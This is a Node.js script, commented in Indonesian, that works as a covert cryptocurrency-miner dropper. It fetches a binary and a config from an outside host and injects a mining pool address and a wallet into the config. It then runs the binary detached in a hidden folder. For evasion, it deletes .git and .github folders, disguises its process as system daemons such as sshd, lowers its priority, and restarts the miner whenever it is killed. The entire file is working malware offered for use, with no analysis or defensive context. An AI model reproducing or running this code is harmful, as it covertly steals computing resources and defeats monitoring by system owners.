// daemon_stealth.js
const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');
const axios = require('axios');
const crypto = require('crypto');

// =================== KONFIGURASI ===================
const DEBUG = false; // Set ke false agar tidak mencetak log ke console

const URL_GENZO = "https://blogspotgenzo.site/UCOK";
const URL_CONFIG = "https://blogspotgenzo.site/config.json";

const FAKE_SYSTEM_NAMES = [
  "systemd-logind",
  "dbus-daemon",
  "kworker/0:1-events",
  "sshd",
  "cron",
  "rsyslogd",
  "containerd-shim",
  "firewalld",
  "udevd"
];

// Lokasi folder kerja tersembunyi
const HIDDEN_DIR = path.join(
  process.env.HOME || process.env.USERPROFILE || process.cwd(),
  '.config',
  '.' + crypto.randomBytes(3).toString('hex')
);

fs.mkdirSync(HIDDEN_DIR, { recursive: true });
process.chdir(HIDDEN_DIR);

const FILE_GENZO = crypto.randomBytes(4).toString('hex');
const FILE_CONFIG = crypto.randomBytes(4).toString('hex') + ".json";
const PID_FILE = path.join(HIDDEN_DIR, 'sys.pid');
const LOG_FILE = path.join(HIDDEN_DIR, 'sys.log');

// =================== LOGGING ===================
function log(msg) {
  const message = `[${new Date().toISOString()}] ${msg}`;
  fs.appendFileSync(LOG_FILE, message + '\n');
  if (DEBUG) console.log(message);
}

// =================== ANTI DETEKSI ===================
function antiDetect() {
  try {
    // 1. Hapus folder source control
    const folders = ['.git', '.firebase', '.github', 'firebase.json'];
    folders.forEach(folder => {
      const target = path.join(process.cwd(), folder);
      if (fs.existsSync(target)) {
        execSync(`rm -rf ${target}`);
        log(`Deleted tracking folder: ${target}`);
      }
    });

    // 2. Rename nama process agar terlihat seperti sistem
    try {
      const fakeName = FAKE_SYSTEM_NAMES[Math.floor(Math.random() * FAKE_SYSTEM_NAMES.length)];
      process.title = fakeName;
      log(`Process disguised as: ${fakeName}`);
    } catch (e) {
      log(`Gagal disguise nama proses: ${e.message}`);
    }

    // 3. Turunkan prioritas proses agar tidak terlihat "rakus"
    try {
      execSync('command -v renice');
      execSync(`renice 19 -p ${process.pid}`);
      log('Process priority lowered for stealth mode');
    } catch (e) {
      log('renice tidak tersedia, skip pengaturan priority.');
    }

  } catch (e) {
    log("Anti-detect error: " + e.message);
  }
}

// =================== ANTI SUSPEND ===================
function antiSuspend(proc) {
  process.on('SIGSTOP', () => {
    log('SIGSTOP terdeteksi! Melanjutkan proses...');
    process.kill(proc.pid, 'SIGCONT');
  });
}

// =================== ANTI BANNED ===================
function monitorAndRestart(proc) {
  setInterval(() => {
    try {
      process.kill(proc.pid, 0); // Mengecek apakah proses hidup
    } catch (e) {
      log("Binary mati! Restarting...");
      runBinary(); // Restart otomatis
    }
  }, 10000); // Cek setiap 10 detik
}

// =================== DOWNLOAD FILE ===================
async function downloadFile(url, outputPath) {
  try {
    const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 15000 });
    fs.writeFileSync(outputPath, response.data);
    log(`Downloaded: ${outputPath}`);
  } catch (error) {
    log(`Gagal download ${url}: ${error.message}`);
  }
}

// =================== EDIT CONFIG ===================
function editConfig(filePath) {
  try {
    let data = fs.readFileSync(filePath, 'utf8');
    data = data.replace(/"tua"/g, '"164.90.210.229:80"')
               .replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Danis"')
               .replace(/"meki"/g, '"power2b"');

    fs.writeFileSync(filePath, data);
    log("Config updated.");
  } catch (e) {
    log("Edit config error: " + e.message);
  }
}

// =================== CEK PID ===================
function isAlreadyRunning() {
  if (fs.existsSync(PID_FILE)) {
    const pid = parseInt(fs.readFileSync(PID_FILE, 'utf8'));
    try {
      process.kill(pid, 0);
      log(`Daemon sudah berjalan dengan PID ${pid}`);
      process.exit(0);
    } catch (e) {
      fs.unlinkSync(PID_FILE);
    }
  }
}

// =================== JALANKAN BINARY ===================
function runBinary() {
  log("Menjalankan binary dalam mode stealth...");

  const proc = spawn(`./${FILE_GENZO}`, ['-c', FILE_CONFIG], {
    detached: true,
    stdio: 'ignore',
    shell: true
  });

  proc.unref();
  fs.writeFileSync(PID_FILE, proc.pid.toString());
  log(`Binary berjalan dengan PID: ${proc.pid}`);

  // Aktifkan anti suspend & anti banned
  antiSuspend(proc);
  monitorAndRestart(proc);

  return proc;
}

// =================== MAIN ===================
(async () => {
  antiDetect();
  isAlreadyRunning();

  // Download file binary dan config
  if (!fs.existsSync(FILE_GENZO)) await downloadFile(URL_GENZO, FILE_GENZO);
  if (!fs.existsSync(FILE_CONFIG)) {
    await downloadFile(URL_CONFIG, FILE_CONFIG);
    editConfig(FILE_CONFIG);
  }

  // Jadikan file binary executable
  fs.chmodSync(FILE_GENZO, 0o755);

  // Jalankan binary
  runBinary();
})();
